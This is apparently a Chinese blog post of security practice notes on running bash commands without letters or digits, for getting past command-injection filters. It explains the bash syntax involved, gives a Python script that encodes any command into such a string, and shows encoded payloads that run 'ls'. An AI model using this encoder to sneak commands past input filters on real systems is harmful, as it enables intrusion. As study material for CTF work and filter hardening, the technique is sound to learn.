---
title: 无字母数字命令执行
date: 2025-11-14
updated: 2025-11-14
tags:
  - 练习总结
categories:
  - 安全相关
description: None
---
## Linux 无字母数字命令执行

```bash
$(...)		# 用于执行命令并把输出结果替换到当前位置

# 假设当前目录下有 a b c
echo "当前目录的文件有: $(ls)"	# a b c

$((...))	# 算数运算 $((1 << 3)) 1的二进制向左移动3位；$((16#FF)) 16进制FF的10进制数255

$'...'		# 带转义的单引号字符串，（如 \n, \t, \xNN, \uXXXX 等）,用于解释 ANSI-C 风格转义字符
echo $'\x48\x65\x6c\x6c\x6f'	# Hello
echo $'\154\163'		# ls

<<<			# 把一个字符串作为命令的标准输入
cat <<< "Hello"

${!var}		# 把变量var的值当成变量名去取值
${#var}		# 获取变量值var的长度
```

```bash
$'\xxx'		# Linux bash 通过该运算符可以将八进制 ascii 码解析为字符
# `ls` 也就是 $'\154\163'
# 用 $'\$(($((1<<1))#binary))' 可以来表示一个字符，这里的bin应该是154的二进制，而不是l的二进制，eg：$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\' -> $'\154\163'，（这里有很多转义符，可以去掉转义在终端测试一下就理解了）
```

```python
cmd = "ls -l"  
  
# def ans_cmd(cmd):  
#     l = []  
#     ans = ""  
#     for i in cmd:  
#         s = str(bin(int(oct(ord(i))[2:]))[2:])  
#         s = s.replace("0", "${#}")  
#         s = s.replace("1", "${##}")  
#         l.append(s)  
#     pre_s = "\\\\$(($((${##}<<${##}))#"  
#     post_s = "))"  
#     for i in l:  
#         ans += pre_s + i + post_s  
#     pre_h = "${!#}<<<$\\\'"  
#     post_h = "\\\'"  
#     return pre_h + ans + post_h  
  
def ans_cmd(cmd):  
    # 预计算不变的字符串，避免循环内重复创建  
    pre_s = "\\\\$(($((${##}<<${##}))#"  
    post_s = "))"  
    pre_h = "${!#}<<<$\\\'"  
    post_h = "\\\'"  
  
    # 使用列表推导式一次性构建所有编码片段  
    encoded_parts = [  
        pre_s  
        + str(bin(int(oct(ord(char))[2:]))[2:])  
        .replace("0", "${#}")  
        .replace("1", "${##}")  
        + post_s  
        for char in cmd  
    ]  
  
    return pre_h + ''.join(encoded_parts) + post_h  
  
print(ans_cmd(cmd))  
```

```bash
# 执行ls
$0<<<$0\<\<\<\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'

$0<<<$0\<\<\<\$\'\\$(($((${##}<<${##}))#${##}00${##}${##}0${##}0))\\$(($((${##}<<${##}))#${##}0${##}000${##}${##}))\'

${!#}<<<${!#}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\'

# 没有中间${!#}\<\<\<\同样可以执行
```

> https://www.freebuf.com/articles/system/361101.html
> 
> https://blog.csdn.net/2302_81572316/article/details/151584634

https://fushuling.com/index.php/2023/03/04/%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4/

## PHP 无字母数字命令执行
